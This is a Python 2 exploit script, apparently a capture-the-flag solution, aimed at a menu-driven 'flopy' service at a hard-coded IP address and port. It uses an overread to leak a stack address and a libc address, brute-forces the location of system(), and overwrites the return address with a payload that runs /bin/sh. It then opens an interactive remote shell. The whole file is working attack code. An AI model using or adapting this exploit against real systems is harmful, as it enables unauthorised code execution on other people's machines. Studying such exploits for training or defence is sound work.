from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

#host = 'localhost'
host = '175.119.158.134'
port = 5559

def choose(flopy_num):
    s.send("1\n")
    s.send("%d\n" % flopy_num)

def write(data, desc):
    s.send("2\n")
    s.send("%s\n" % data)
    s.send("%s\n" % desc) 

def read():
    s.send("3\n")

def modify(act, content):
    s.send("4\n")
    if act == "desc":
        s.send("1\n")
    else:
        s.send("2\n")
    time.sleep(0.5)
    s.send("%s\n" % content)

def exit():
    s.send("5\n")

offset = 0x225d0
while True:
    s = socket( AF_INET, SOCK_STREAM )
    s.connect((host,port))

    # Choose flopy 1
    print "[INFO] Try offset - %s" % hex(offset)
    recv_until(s, ">\n")
    choose(1)

    recv_until(s, ">\n")
    write("A"*511, "B"*9)

    # Leak stack address of flopy 1
    recv_until(s, ">\n")
    modify("desc", "LEAPMARKER".rjust(16, "C"))

    recv_until(s, ">\n")
    read()

    recv_until(s, "LEAPMARKER")
    stack_addr = unpack("<L", s.recv(4))[0]
    print "[INFO] Leaked stack addr (flopy 1): %s" % hex(stack_addr)

    # Leak libc address
    recv_until(s, ">\n")
    modify("desc", "LEAPMARKER".rjust(32, "C"))

    recv_until(s, ">\n")
    choose(1)

    recv_until(s, ">\n")
    read()

    recv_until(s, "LEAPMARKER")
    libc_addr = unpack("<L", s.recv(4))[0] & 0xfffffff0
    print "[INFO] Leaked libc addr (__libc_start_main+243): %s" % hex(libc_addr)

    system_addr = libc_addr + offset
    print "[INFO] Try system addr: %s" % hex(system_addr)

    # Exploit!
    payload = ""
    payload+= pack("<L", system_addr)       # EIP
    payload+= "AAAA"
    payload+= pack("<L", stack_addr + 32)   # "/bin/sh;#"
    payload+= "B"*8                         # dummy
    payload+= pack("<L", stack_addr + 12)   # SP
    payload+= "/bin/sh;#"

    recv_until(s, ">\n")
    modify("desc", payload)

    # trigger
    exit()

    try:
            t = telnetlib.Telnet()
            t.sock = s
            t.interact()
            t.close()
    except KeyboardInterrupt:
            pass

    
    s.close()
    offset += 0x10

